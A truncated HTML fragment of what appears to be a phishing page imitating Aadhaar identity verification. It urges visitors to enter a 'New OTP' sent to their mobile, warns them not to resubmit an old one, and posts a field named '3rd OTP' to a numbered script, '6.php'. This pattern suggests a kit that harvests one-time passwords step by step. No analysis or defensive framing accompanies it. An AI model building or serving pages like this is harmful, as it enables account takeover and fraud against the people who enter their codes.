...
<body>
    ...
    width:345px;
    height:55px;"
    > Validate One Time Password<br>(OTP).</h3>
    <center> <p5>Please enter The One Time Password(OTP) 
    which was sent to your registered mobile number.</p5></center><br>
    <div id="zz">
    <center>Your Aadhar Verification is under process Don't Submit old OTP..</center><br>


<center>Enter New OTP..</center><br>
    ...
    <form action="6.php" method="post">
         ...
         <div id="dd">
         <input type="tel" name="3rd OTP" class="pst" required=""
